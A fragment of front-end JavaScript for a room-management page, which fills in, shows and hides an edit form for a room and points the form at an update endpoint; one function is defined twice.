	const row = button.closest('tr');
	row.remove();
  }


  ///Edit Room Form related Java Script
  // Show the edit form with the room's data populated
  function showEditForm(roomId) {
	// Find the row with the matching room ID
	const row = document.querySelector(`tr[data-room-id="${roomId}"]`);
  
	// Ensure the row exists
	if (row) {
	  // Populate the form with the room data
	  document.getElementById('editRoomId').value = roomId;
	  document.getElementById('editRoomName').value = row.querySelector('.room-name').innerText;
	  document.getElementById('editRoomCapacity').value = row.querySelector('.room-capacity').innerText;
	  document.getElementById('editRoomFacilities').value = row.querySelector('.room-facilities').innerText;
	  document.getElementById('editRoomAvailability').value = row.querySelector('.room-availability').innerText === 'Available' ? 'true' : 'false';
  
	  // Show the edit form
	  document.getElementById('editFormContainer').classList.remove('hidden');
	} else {
	  console.error("Room row not found!");
	}
  }
  
  
  
  // Close the edit form
  function closeEditForm() {
	document.getElementById('editFormContainer').classList.add('hidden');
  }
  
  // Handle the form submission
  function showEditForm(roomId) {
    // Find the row with the matching room ID
    const row = document.querySelector(`tr[data-room-id="${roomId}"]`);

    // Ensure the row exists
    if (row) {
        // Populate the form with the room data
        document.getElementById('editRoomId').value = roomId;
        document.getElementById('editRoomName').value = row.querySelector('.room-name').innerText;
        document.getElementById('editRoomCapacity').value = row.querySelector('.room-capacity').innerText;
        document.getElementById('editRoomFacilities').value = row.querySelector('.room-facilities').innerText;
        document.getElementById('editRoomAvailability').value = row.querySelector('.room-availability').innerText === 'Available' ? 'true' : 'false';

        // Update the form action to point to the correct endpoint with the room ID
        const form = document.getElementById('editRoomForm');
        form.action = `/update-room/${roomId}`;

        // Show the edit form
        document.getElementById('editFormContainer').classList.remove('hidden');
    } else {
        console.error("Room row not found!");
    }
}

  

  
  




